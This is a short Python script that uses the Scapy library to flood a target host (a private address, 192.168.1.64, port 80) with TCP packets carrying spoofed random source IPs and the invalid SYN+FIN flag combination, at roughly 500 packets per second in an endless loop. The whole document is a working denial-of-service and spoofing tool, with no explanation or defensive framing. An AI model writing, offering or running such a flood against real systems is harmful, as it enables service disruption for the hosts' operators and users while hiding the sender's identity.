from scapy.all import IP, TCP, send, RandIP, RandShort
import time

target = "192.168.1.64"   
dport   = 80              
pps     = 500           

while True:
    pkt = IP(src=RandIP(), dst=target)/TCP(
        sport=RandShort(),    
        dport=dport,
        flags="SF"            
    )
    send(pkt, verbose=False)
    time.sleep(1/pps)